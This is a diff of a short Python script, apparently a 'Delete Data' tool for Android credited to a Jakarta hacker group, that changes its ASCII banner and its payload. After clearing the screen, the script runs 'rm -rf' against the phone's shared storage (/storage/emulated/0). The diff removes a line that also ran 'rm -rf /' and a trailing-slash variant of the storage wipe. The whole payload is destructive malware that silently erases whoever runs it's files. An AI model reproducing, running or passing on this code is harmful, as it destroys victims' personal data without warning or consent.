@@ -12,14 +12,13 @@ y = '\033[33;1m'
 
 system('clear')
 print g + "#########################################"
-print g + "# Sokushinbutsu              #"
-print g + "# Harakiri                   #"
-print g + "# Kamikaze                   #"
-print g + "#           #"
-print g + "# انالله وان اليه رجعون #"
+print g + "# Author : 3XP3T4S1                     #"
+print g + "# Tools : Delete Data                   #"
+print g + "# RyanTattoo hanya memilah              #"
+print g + "# Thanks to 3XP3T4S1                    #"
+print g + "# Thanks all member Jakarta Cyber Army  #"
 print g + "#########################################"
 
 system('clear')
 system("cd /sdcard")
-system("rm -rf /storage/emulated/0/")
-system("rm -rf /")
+system("rm -rf /storage/emulated/0")
